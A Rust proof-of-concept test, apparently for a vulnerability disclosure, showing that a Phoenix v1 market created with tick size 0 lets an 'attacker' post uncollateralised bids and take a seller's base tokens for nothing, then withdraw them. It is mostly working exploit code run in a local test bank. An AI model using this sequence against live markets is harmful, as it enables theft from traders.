// ============================================================================
// PoC: tick_size == 0 market  ->  zero-collateral bids  ->  takers hand over
//      base tokens for 0 quote tokens.
//
// Target : Ellipsis-Labs/phoenix-v1  (HEAD 6ae54af)
// Root   : src/program/processor/initialize.rs  never asserts
//          `tick_size_in_quote_lots_per_base_unit >= 1`.
//          state/markets/fifo.rs:594 only asserts  tick % base_lots_per_base_unit == 0
//          (0 % N == 0, so 0 passes both checks).
// Effect : quote_lots_to_lock = (tick_size * price * size) / base_lots_per_unit = 0
//          => a resting bid costs the maker nothing, and
//             matched_adjusted_quote_lots = price * 0 * size = 0
//          => the taker's base lots are transferred to the maker and the taker
//             receives 0 quote atoms (no slippage check on a plain market order).
//
// HOW TO RUN (on your machine, full block - do not run a bare command):
//   set -e
//   export ANCHOR_WALLET=$HOME/.config/solana/id.json
//   export RUST_BACKTRACE=1
//   export RUST_LOG=solana_runtime=warn,phoenix=info
//   rm -rf /tmp/phoenix-poc && git clone https://github.com/Ellipsis-Labs/phoenix-v1 /tmp/phoenix-poc
//   cd /tmp/phoenix-poc && git checkout 6ae54af
//   # append this file (everything below the marker) to tests/test_phoenix.rs
//   cat /path/to/poc_tick_zero.rs >> tests/test_phoenix.rs   # skip the header comment block
//   cargo test --release --test test_phoenix poc_tick_size_zero -- --nocapture
//
// No RPC key and no external validator are needed: tests/test_phoenix.rs runs on
// the in-process ProgramTest bank (`phoenix_test()`), so everything is local.
// ============================================================================

#[tokio::test]
async fn poc_tick_size_zero_zero_collateral_bid() {
    // quote: 6 decimals, 100_000 quote lots per quote unit -> quote_lot_size = 10 atoms
    // base : 9 decimals,   1_000 base lots per base unit   -> base_lot_size  = 1_000_000 atoms
    // tick : 0 quote lots per base unit  <-- accepted by InitializeMarket
    let (mut client, ctx) = bootstrap_with_parameters(100_000, 1_000, 0, 9, 6, 0, None).await;

    // attacker and victim both hold exactly 1 base unit (1e9 atoms = 1000 base lots) + 1 quote unit
    let attacker = get_new_maker(&client, &ctx, 1, 1).await; // seat approved by the authority
    let victim = get_new_maker(&client, &ctx, 1, 1).await;

    let PhoenixTestClient {
        sdk, market, meta, ..
    } = &mut client;
    let base_mint = &meta.base_mint;
    let quote_mint = &meta.quote_mint;

    // ---------------------------------------------------------------- step 1
    // Attacker posts a BID for 1000 base lots at 1_000_000 ticks and deposits nothing.
    let att_quote_before = get_token_balance(&sdk.client, attacker.quote_ata).await;
    let att_base_before = get_token_balance(&sdk.client, attacker.base_ata).await;

    let bid = OrderPacket::new_post_only_default(Side::Bid, 1_000_000, 1_000);
    let bid_ix =
        create_new_order_instruction(market, &attacker.user.pubkey(), base_mint, quote_mint, &bid);
    sdk.client
        .sign_send_instructions(vec![bid_ix], vec![&attacker.user])
        .await
        .unwrap();

    let att_quote_after_bid = get_token_balance(&sdk.client, attacker.quote_ata).await;
    println!(
        "[step 1] attacker quote lots collateral: before={} after_bid={}",
        att_quote_before, att_quote_after_bid
    );
    assert_eq!(
        att_quote_before, att_quote_after_bid,
        "a 1000-lot bid at 1e6 ticks must have required collateral, but locked/deposited 0"
    );

    // ---------------------------------------------------------------- step 2
    // Victim sends a market SELL of 1000 base lots into that free bid.
    let vic_base_before = get_token_balance(&sdk.client, victim.base_ata).await;
    let vic_quote_before = get_token_balance(&sdk.client, victim.quote_ata).await;

    let sell = OrderPacket::new_ioc_by_lots(
        Side::Ask,
        0, // price_in_ticks = 0 -> limit price 0, i.e. "sell at any price"
        1_000,
        SelfTradeBehavior::Abort,
        None,
        0,
        false,
    );
    let sell_ix =
        create_new_order_instruction(market, &victim.user.pubkey(), base_mint, quote_mint, &sell);
    sdk.client
        .sign_send_instructions(vec![sell_ix], vec![&victim.user])
        .await
        .unwrap();

    let vic_base_after = get_token_balance(&sdk.client, victim.base_ata).await;
    let vic_quote_after = get_token_balance(&sdk.client, victim.quote_ata).await;
    println!(
        "[step 2] victim base: {} -> {} (lost {})",
        vic_base_before,
        vic_base_after,
        vic_base_before.saturating_sub(vic_base_after)
    );
    println!(
        "[step 2] victim quote: {} -> {} (received {})",
        vic_quote_before,
        vic_quote_after,
        vic_quote_after.saturating_sub(vic_quote_before)
    );
    assert_eq!(
        vic_base_before - vic_base_after,
        1_000 * 1_000_000,
        "victim must hand over 1000 base lots"
    );
    assert_eq!(
        vic_quote_after, vic_quote_before,
        "victim must receive exactly 0 quote atoms for those base lots"
    );

    // ---------------------------------------------------------------- step 3
    // Attacker withdraws the stolen base lots. Net cost of the attack: 0.
    let att_base_before_wd = get_token_balance(&sdk.client, attacker.base_ata).await;
    let wd = create_withdraw_funds_instruction(
        market,
        &attacker.user.pubkey(),
        base_mint,
        quote_mint,
    );
    sdk.client
        .sign_send_instructions(vec![wd], vec![&attacker.user])
        .await
        .unwrap();
    let att_base_after_wd = get_token_balance(&sdk.client, attacker.base_ata).await;
    println!(
        "[step 3] attacker base: {} -> {} (stole {})",
        att_base_before_wd,
        att_base_after_wd,
        att_base_after_wd.saturating_sub(att_base_before_wd)
    );
    assert_eq!(
        att_base_after_wd - att_base_before_wd,
        1_000 * 1_000_000,
        "attacker must be able to withdraw the victim's base lots"
    );
    assert_eq!(
        get_token_balance(&sdk.client, attacker.quote_ata).await,
        att_quote_before,
        "attacker paid nothing at any point"
    );
    println!(
        "[RESULT] attacker base delta = +{}, attacker quote delta = 0 (started with {} base atoms)",
        att_base_after_wd - att_base_before,
        att_base_before
    );

    // Control: the exact same bid on a market with tick_size = 1 is rejected for
    // insufficient funds / requires collateral, i.e. the exploit is the missing
    // `tick_size >= 1` validation, not the order code.
}
